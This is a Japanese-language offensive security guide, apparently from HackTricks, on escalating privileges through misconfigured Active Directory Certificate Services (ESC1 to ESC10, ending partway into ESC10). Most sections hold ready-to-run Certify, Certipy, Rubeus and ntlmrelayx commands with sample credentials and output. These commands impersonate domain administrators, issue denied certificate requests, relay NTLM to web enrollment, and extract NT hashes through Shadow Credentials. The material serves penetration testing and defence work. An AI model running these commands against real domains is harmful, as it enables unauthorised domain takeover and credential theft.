# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**これは、記事における escalation technique セクションの概要です:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA によって、低権限ユーザーに Enrolment 権限が付与されている。**
- **Manager approval が必要ない。**
- **認可された担当者による署名が必要ない。**
- **Certificate template の Security descriptor が過度に許可的であり、低権限ユーザーが Enrolment 権限を取得できる。**
- **Certificate template が、authentication を可能にする EKU を定義するよう設定されている:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) identifier が含まれている。
- **requester が Certificate Signing Request (CSR) に subjectAltName を含めることが template によって許可されている:**
- Active Directory (AD) は、証明書に subjectAltName (SAN) が存在する場合、identity verification においてこれを優先する。つまり、CSR に SAN を指定することで、任意のユーザー (例: domain administrator) を impersonate するための証明書を要求できる。requester が SAN を指定できるかどうかは、certificate template の AD object にある `mspki-certificate-name-flag` property によって示される。この property は bitmask であり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag が存在すると、requester による SAN の指定が許可される。

> [!CAUTION]
> この設定では、低権限ユーザーが任意の SAN を持つ証明書を要求できるため、Kerberos または SChannel を通じて任意の domain principal として authentication できる。

この機能は、products や deployment services による HTTPS または host certificate の on-the-fly generation をサポートするため、または理解不足により有効化されることがある。

この option を使用して証明書を作成すると warning が表示されるが、既存の certificate template (たとえば `WebServer` template。`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効化されている) を duplicate し、authentication OID を含めるよう変更した場合には warning が表示されないことに注意が必要である。<sup>[[6]](#references)</sup>

### Abuse

**vulnerable certificate template を見つける**には、次を実行できます:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすますには**、次を実行します。
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された **certificate を `.pfx`** 形式に変換し、再び **Rubeus または certipy を使用して authenticate** できます:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリの「Certreq.exe」と「Certutil.exe」を使用して PFX を生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内にある証明書テンプレートのうち、承認や署名が不要で、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものは、次の LDAP クエリを実行して列挙できます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 設定ミスのある Certificate Templates - ESC2

### 説明

2つ目の abuse scenario は、1つ目のバリエーションです。

1. Enterprise CA によって、権限の低いユーザーに enrollment rights が付与されている。
2. manager approval の要件が無効化されている。
3. authorized signatures の必要性が省略されている。
4. certificate template の過度に permissive な security descriptor により、権限の低いユーザーに certificate enrollment rights が付与されている。
5. **certificate template に Any Purpose EKU または EKU なしが含まれるよう定義されている。**

**Any Purpose EKU** により、攻撃者は client authentication、server authentication、code signing など、**あらゆる目的**で certificate を取得できます。この scenario の exploit には、**ESC3 で使用される technique** と同じものを利用できます。

**EKU がない** certificates は subordinate CA certificates として機能し、**あらゆる目的**で exploit でき、**新しい certificates の署名にも使用できます**。したがって、攻撃者は subordinate CA certificate を利用することで、新しい certificates に任意の EKUs や fields を指定できます。

ただし、subordinate CA が **`NTAuthCertificates`** object によって信頼されていない場合、**domain authentication** 用に作成された新しい certificates は機能しません。これはデフォルト設定です。それでも攻撃者は、**任意の EKU** と任意の certificate values を持つ **新しい certificates** を作成できます。これらは、code signing、server authentication など、幅広い目的で **abuse** される可能性があり、SAML、AD FS、IPSec など、network 内の他の applications に重大な影響を及ぼす可能性があります。<sup>[[6]](#references)</sup>

AD Forest の configuration schema 内でこの scenario に一致する templates を列挙するには、次の LDAP query を実行できます。
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

このシナリオは最初と2番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と**2つの異なるテンプレート**を**悪用**します（そのため、要件のセットも2つあります）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、プリンシパルが**別のユーザーに代わって** **certificate** に**enroll** できるようにします。

**「enrollment agent」**は、このような**テンプレート**に**enroll**し、取得した**certificate を使用して、他のユーザーに代わって CSR に共同署名**します。その後、**共同署名された CSR**を CA に**送信**し、**「enroll on behalf of」**を許可する**テンプレート**に**enroll**します。CA は「他の」ユーザーに属する**certificate**を返します。<sup>[[6]](#references)</sup>

**要件 1:**

- Enterprise CA によって、低権限ユーザーに enrollment 権限が付与されている。
- manager approval の要件が省略されている。
- authorized signatures の要件がない。
- certificate template の security descriptor が過度に寛 permissive で、低権限ユーザーに enrollment 権限を付与している。
- certificate template に Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の certificate template を要求できる。

**要件 2:**

- Enterprise CA が低権限ユーザーに enrollment 権限を付与している。
- manager approval が bypass されている。
- template の schema version が 1 または 2 より大きく、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement を指定している。
- certificate template で定義された EKU により、domain authentication が許可されている。
- CA 上で enrollment agent の制限が適用されていない。

### Abuse

このシナリオを**悪用**するには、[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用できます。<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** の**取得**を許可されている **users**、enrollment **agents** が enroll を許可されているテンプレート、および enrollment agent が代理として行動できる **accounts** は、enterprise CAs によって制限できます。これは、`certsrc.msc` **snap-in** を開き、**CA を右クリック**して **Properties** をクリックし、「Enrollment Agents」タブに**移動**することで実現できます。

ただし、CAs の **default** 設定は「**Do not restrict enrollment agents**」であることに注意してください。管理者が enrollment agents の制限を有効にし、「Restrict enrollment agents」に設定した場合でも、default configuration は依然として非常に permissive です。これにより、**Everyone** がすべてのテンプレートに、任意の人物として enroll するアクセスが許可されます。

## 脆弱な Certificate Template Access Control - ESC4

### **説明**

**certificate templates** の **security descriptor** は、テンプレートに関して特定の **AD principals** が持つ **permissions** を定義します。

**attacker** が **template** を**変更**し、**prior sections** で説明した **exploitable misconfigurations** を**導入**するために必要な **permissions** を持っている場合、privilege escalation が可能になります。

certificate templates に適用される主な permissions には、以下が含まれます。<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙的な control を付与し、任意の属性を変更できるようにします。
- **FullControl:** 任意の属性を変更する機能を含め、オブジェクトに対する完全な authority を有効にします。
- **WriteOwner:** オブジェクトの owner を、attacker が control する principal に変更できます。
- **WriteDacl:** access controls を調整でき、attacker に FullControl を付与できる可能性があります。
- **WriteProperty:** 任意のオブジェクト properties の編集を許可します。

### Abuse

templates やその他の PKI objects に対する編集権限を持つ principals を特定するには、Certify で enumerate します。
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前述のものと同様の privesc の例です。

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが certificate template に対する write 権限を持っている場合です。たとえば、certificate template の設定を上書きして、テンプレートを ESC1 に対して脆弱にするために悪用できます。

上記のパスからわかるように、これらの権限を持っているのは `JOHNPC` だけですが、私たちのユーザー `JOHN` には `JOHNPC` への新しい `AddKeyCredentialLink` edge があります。この technique は certificates に関連するため、この攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。<sup>[[8]](#references)</sup> 以下は、被害者の NT hash を取得するための Certipy の `shadow auto` command の簡単な例です。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、1つのコマンドで certificate template の設定を上書きできます。**デフォルト**では、設定を上書きして **ESC1 に対して脆弱な状態**にします。また、**`-save-old` パラメータを指定して以前の設定を保存**することもできます。これは、攻撃後に設定を**復元**する際に役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱な PKI オブジェクトのアクセス制御 - ESC5

### 説明

証明書テンプレートや証明機関以外の複数のオブジェクトを含む、相互に関連した ACL ベースの関係は、AD CS システム全体の security に影響を及ぼす可能性があります。security に大きな影響を与えるこれらのオブジェクトには、次のものが含まれます。

- S4U2Self や S4U2Proxy などの手法によって compromise される可能性がある、CA server の AD computer object。
- CA server の RPC/DCOM server。
- 特定の container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、あらゆる descendant AD object または container。この path には、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などの container や object が含まれますが、これらに限定されません。

低権限の attacker がこれらの重要な component のいずれかを control できた場合、PKI system の security が compromise される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academy の post**](https://cqureacademy.com/blog/enhanced-key-usage) では、Microsoft が説明している **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の影響についても取り上げています。この configuration を Certification Authority (CA) で有効にすると、Active Directory® から作成された request を含む**あらゆる request**で、**user-defined values** を **subject alternative name** に含めることが可能になります。その結果、**intruder** は、domain **authentication** 用に設定された**任意の template**を通じて enroll できます。具体的には、標準の User template のように、**unprivileged** user による enrollment が許可されている template が対象です。これにより、intruder は domain administrator または domain 内の**その他の有効な entity**として authentication できる certificate を取得できます。<sup>[[9]](#references)</sup>

**Note**: `certreq.exe` の `-attrib "SAN:"` argument（「Name Value Pairs」と呼ばれます）を使用して Certificate Signing Request (CSR) に **alternative names** を追加する方法は、ESC1 における SAN の exploitation strategy とは異なります。ここでの違いは、account information が certificate extension ではなく、certificate attribute 内に格納される点にあります。

### Abuse

setting が有効になっているか確認するには、以下の `certutil.exe` command を使用できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は基本的に **remote registry access** を利用するため、別のアプローチとしては次のようなものが考えられます：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) や [**Certipy**](https://github.com/ly4k/Certipy) などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**domain administrative** 権限または同等の権限を持っていれば、以下のコマンドを任意のワークステーションから実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの設定を無効にするには、次のコマンドでフラグを削除できます：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のセキュリティ更新プログラム以降、新たに発行される **certificates** には、**requester の `objectSid` プロパティ**を組み込んだ **security extension** が含まれます。ESC1では、このSIDは指定されたSANから派生します。しかし、**ESC6**では、SIDはSANではなく **requester の `objectSid`** を反映します。\
> ESC6を悪用するには、**SANよりも新しいsecurity extensionを優先する**ESC10（Weak Certificate Mappings）の影響を受けやすいシステムであることが不可欠です。

## Vulnerable Certificate Authority Access Control - ESC7

### 攻撃 1

#### 説明

certificate authorityのアクセス制御は、CAのアクションを管理する一連の権限によって維持されています。これらの権限は、`certsrv.msc` にアクセスし、CAを右クリックしてプロパティを選択し、Securityタブに移動することで確認できます。さらに、次のようなコマンドを使用して、PSPKI moduleで権限を列挙できます：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主な権限である **`ManageCA`** と **`ManageCertificates`** に関する情報を提供します。これらはそれぞれ「CA administrator」と「Certificate Manager」の役割に対応します。<sup>[[6]](#references)</sup>

#### Abuse

Certificate authority に対する **`ManageCA`** 権限を持つと、principal は PSPKI を使用してリモートから設定を操作できます。これには、任意の template で SAN の指定を許可する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグの切り替えが含まれ、これは domain escalation における重要な要素です。

このプロセスは、PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化できます。これにより、GUI を直接操作せずに変更できます。

**`ManageCertificates`** 権限を持つと、保留中の request を承認でき、「CA certificate manager approval」という保護機能を実質的に回避できます。

**Certify** と **PSPKI** modules を組み合わせることで、certificate の request、承認、download を実行できます:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻撃 2

#### 説明

> [!WARNING]
> **前回の攻撃**では、**`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを **有効化**し、**ESC6 攻撃**を実行しましたが、CA サービス（`CertSvc`）を再起動するまで効果はありません。ユーザーが **`Manage CA`** のアクセス権を持っている場合、そのユーザーは **サービスを再起動**することも許可されています。ただし、**サービスをリモートから再起動できる**という意味ではありません。さらに、2022 年 5 月のセキュリティ更新プログラムにより、パッチが適用されたほとんどの環境では、E**SC6 はそのままでは動作しない可能性があります**。

そのため、ここでは別の攻撃を紹介します。

前提条件：

- **`ManageCA` 権限のみ**
- **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
- 証明書テンプレート **`SubCA`** が **有効化**されていること（**`ManageCA`** から有効化可能）

この technique は、`Manage CA` _および_ `Manage Certificates` のアクセス権を持つユーザーが、**失敗した証明書リクエストを発行できる**という事実を利用します。**`SubCA`** 証明書テンプレートは **ESC1 に対して脆弱**ですが、テンプレートに enroll できるのは **管理者のみ**です。したがって、**ユーザー**は **`SubCA`** への enroll を **要求**できます。この要求は **拒否**されますが、**その後、manager によって発行されます**。<sup>[[6]](#references)</sup>

#### 悪用

新しい officer として自分のユーザーを追加することで、**`Manage Certificates`** アクセス権を自分に **付与**できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template は、`-enable-template` parameter を使用して **CA で有効化**できます。デフォルトでは、`SubCA` template は有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合は、まず **`SubCA` template に基づく certificate の request** を開始できます。

**この request は拒否されます**が、private key を保存し、request ID を記録しておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と `Manage Certificates` を使用すると、`ca` コマンドに `-issue-request <request ID>` パラメータを指定して、失敗した証明書要求を発行できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
そして最後に、`req` コマンドと `-retrieve <request ID>` パラメーターを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

従来の ESC7 abuse（EDITF 属性の有効化や保留中の request の承認）に加えて、**Certify 2.0** により、Enterprise CA 上の *Manage Certificates*（別名 **Certificate Manager / Officer**）role だけを必要とする、まったく新しい primitive が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method は、*Manage Certificates* を保持する任意の principal が実行できます。この method は従来、正規の CA が **pending** request の extension を更新するために使用していました。しかし attacker はこれを abuse して、承認待ちの request に **デフォルトではない certificate extension**（例えば `1.1.1.1` のような custom *Certificate Issuance Policy* OID）を **append** できます。

対象の template がその extension のデフォルト値を **定義していない** 場合、request が最終的に発行される際に CA は attacker が制御する値を上書きしません。そのため、生成される certificate には attacker が選択した extension が含まれ、次の用途に利用できます。

* 他の vulnerable な template の Application / Issuance Policy 要件を満たす（privilege escalation につながる）。
* 追加の EKU や policy を inject し、third-party system において certificate に予期しない trust を与える。

つまり、従来 ESC7 の「より権限の弱い」側と考えられていた *Manage Certificates* を、CA configuration に触れたり、より制限の厳しい *Manage CA* right を必要としたりすることなく、full privilege escalation や長期的な persistence に利用できるようになりました。

#### Certify 2.0 による primitive の abuse

1. ***pending* のままになる certificate request を submit します。** manager approval を要求する template を使うことで、これを強制できます。
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# 返された Request ID を記録
```

2. 新しい `manage-ca` command を使用して、pending request に custom extension を **append** します。
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template がすでに *Certificate Issuance Policies* extension を定義していない場合、上記の値は発行後も保持されます。*

3. （role に *Manage Certificates* の approval rights もある場合は）request を **issue** するか、operator が承認するまで待機します。発行されたら certificate を download します。
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された certificate には malicious な issuance-policy OID が含まれるため、後続の attack（例：ESC13、domain escalation など）で使用できます。

> NOTE: 同じ attack は、`ca` command と `-set-extension` parameter を使用して Certipy ≥ 4.7 でも実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> **AD CS が install されている** environment で、**vulnerable な web enrollment endpoint が存在**し、さらに少なくとも 1 つの **certificate template が publish されており、domain computer enrollment と client authentication を許可している**（デフォルトの **`Machine`** template など）場合、spooler service が active な **任意の computer を attacker が compromise できる**ようになります！

AD CS は複数の **HTTP-based enrollment method** をサポートしており、これらは administrator が install できる追加の server role によって提供されます。HTTP-based certificate enrollment 用のこれらの interface は、**NTLM relay attack** の影響を受けます。attacker は **compromised machine から、inbound NTLM によって authentication される任意の AD account を impersonate できます**。victim account を impersonate している間、attacker はこれらの web interface にアクセスし、`User` または `Machine` certificate template を使用して client authentication certificate を **request** できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP application）は、デフォルトでは HTTP のみであり、NTLM relay attack に対する protection を提供しません。さらに、Authorization HTTP header を通じた NTLM authentication のみを明示的に許可するため、Kerberos のようなより secure な authentication method は適用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、デフォルトで Authorization HTTP header を介した negotiate authentication をサポートします。Negotiate authentication は Kerberos と **NTLM の両方をサポート**するため、attacker は relay attack 中に authentication を **NTLM に downgrade** できます。これらの web service はデフォルトで HTTPS を有効にしますが、HTTPS だけでは NTLM relay attack から保護できません。HTTPS service を NTLM relay attack から保護するには、HTTPS と channel binding の組み合わせが必要です。しかし残念ながら、AD CS は IIS 上で Extended Protection for Authentication を有効化しません。これは channel binding に必要です。<sup>[[6]](#references)</sup>

NTLM relay attack における一般的な **issue** は、**NTLM session の duration が短い**ことと、**NTLM signing を要求する service と attacker が interact できない**ことです。

それでも、user 用の certificate を取得するために NTLM relay attack を exploit することで、この制限を克服できます。certificate の validity period が session の duration を決定し、certificate は **NTLM signing を mandate する service** で使用できるためです。stolen certificate の利用方法については、次を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack のもう 1 つの制限は、**attacker-controlled machine が victim account によって authentication される必要がある**ことです。attacker は待機するか、この authentication を **force** しようとすることができます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**enabled な HTTP AD CS endpoint** を enumerate します。<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ Certificate Authorities (CAs) が Certificate Enrollment Service (CES) のエンドポイントを格納するために使用されます。これらのエンドポイントは、**Certutil.exe** を使用して解析および一覧表示できます。
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyを使用した悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)を使った悪用

証明書のリクエストは、デフォルトでCertipyによって`Machine`または`User`テンプレートに基づいて行われます。これは、relayされるアカウント名が`$`で終わるかどうかによって決まります。別のテンプレートを指定するには、`-template`パラメーターを使用します。

次に、[PetitPotam](https://github.com/ly4k/PetitPotam)のようなtechniqueを使って、認証を強制できます。ドメインコントローラーを扱う場合は、`-template DomainController`の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

**`msPKI-Enrollment-Flag`** の新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）は、ESC9 と呼ばれ、証明書への **新しい `szOID_NTDS_CA_SECURITY_EXT` security extension** の埋め込みを防ぎます。このフラグは、**`StrongCertificateBindingEnforcement`** が `1`（デフォルト設定）に設定されている場合に関係します。これは、`2` に設定されている場合とは異なります。Kerberos または Schannel に対するより弱い証明書マッピングが悪用される可能性があるシナリオ（ESC10 など）では、このフラグの重要性が高まります。ESC9 が存在しない場合、要件は変わりません。<sup>[[7]](#references)</sup>

このフラグの設定が重要になる条件は次のとおりです。

- `StrongCertificateBindingEnforcement` が `2` に変更されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書の **`msPKI-Enrollment-Flag`** 設定で、証明書に **`CT_FLAG_NO_SECURITY_EXTENSION`** フラグが付与されている。
- 証明書でいずれかの client authentication EKU が指定されている。
- 別のアカウントを compromise するために、いずれかのアカウントに対する `GenericWrite` 権限が利用可能である。

### Abuse Scenario

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を compromise することを目的としているとします。`Jane@corp.local` が enroll できる `ESC9` certificate template は、**`msPKI-Enrollment-Flag`** 設定で **`CT_FLAG_NO_SECURITY_EXTENSION`** フラグが有効化されています。

まず、`John` の `GenericWrite` を利用し、Shadow Credentials によって `Jane` の hash を取得します。
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane` の `userPrincipalName` は `Administrator` に変更され、意図的に `@corp.local` のドメイン部分が省略されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として独立したままであるため、制約に違反しません。

これに続いて、脆弱とマークされた `ESC9` certificate template が `Jane` として要求されます：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` には `Administrator` が反映されており、「object SID」は含まれていないことが確認できます。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で authentication を試行すると、`Administrator@corp.local` の NT hash が得られます。証明書に domain の指定がないため、コマンドには `-domain <domain>` を含める必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 説明

ESC10では、domain controller上の2つのregistry key valueを指します。

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 配下の `CertificateMappingMethods` のデフォルト値は `0x18`（`0x8 | 0x10`）で、以前は `0x1F` に設定されていました。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 配下の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` で、以前は `0` でした。<sup>[[7]](#references)</sup>

**Case 1**

`StrongCertificateBindingEnforcement` が `0` に設定されている場合。

